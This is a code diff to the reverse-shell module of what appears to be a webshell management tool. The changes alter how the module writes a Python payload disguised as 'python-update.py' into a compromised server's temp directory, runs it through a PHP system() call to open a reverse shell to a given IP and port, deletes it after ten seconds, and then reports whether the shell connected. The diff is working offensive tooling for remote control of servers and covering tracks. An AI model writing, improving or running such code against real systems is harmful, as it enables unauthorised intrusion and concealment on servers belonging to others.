@@ -1,7 +1,8 @@
 from threading import Thread
+from time import sleep
 
 from libs.config import alias, color, gget
-from libs.myapp import send, delay_send, has_env, is_windows
+from libs.myapp import delay_send, has_env, is_windows, send
 
 
 def get_reverse_php(ip: str, port: str):
@@ -146,16 +147,16 @@ def run(ip: str, port: str, reverse_type: str = "php"):
                 pyname = "python-update.py"
                 upload_tmp_dir = gget("webshell.upload_tmp_dir", "webshell")
                 text = send(
-                    f"print(file_put_contents('{upload_tmp_dir}\\\\{pyname}', \"{python}\"));"
+                    f"print(file_put_contents('{upload_tmp_dir}{pyname}', \"{python}\"));"
                 ).r_text.strip()
                 if not len(text):
-                    print(color.red("Failed to write file in tmp_upload directory."))
+                    print(color.red(f"Failed to write file in {upload_tmp_dir if upload_tmp_dir else 'current'} directory."))
                     return
-                t = Thread(target=send, args=(f"system('python {upload_tmp_dir}\\\\{pyname}');",))
+                t = Thread(target=send, args=(f"system('python {upload_tmp_dir}{pyname}');",))
                 t.setDaemon(True)
                 t.start()
                 t2 = Thread(
-                    target=delay_send, args=(10.0, f"unlink('{upload_tmp_dir}\\\\{pyname}');",)
+                    target=delay_send, args=(10.0, f"unlink('{upload_tmp_dir}{pyname}');",)
                 )
                 t2.setDaemon(True)
                 t2.start()
@@ -171,3 +172,9 @@ def run(ip: str, port: str, reverse_type: str = "php"):
             )
     else:
         print(color.red("Reverse type Error."))
+        return
+    sleep(1)
+    if (t.isAlive()):
+        print(f"\nReverse shell to  {ip}:{port} {color.green('success')}.\n")
+    else:
+        print(f"\nReverse shell {color.red('error')}.\n")
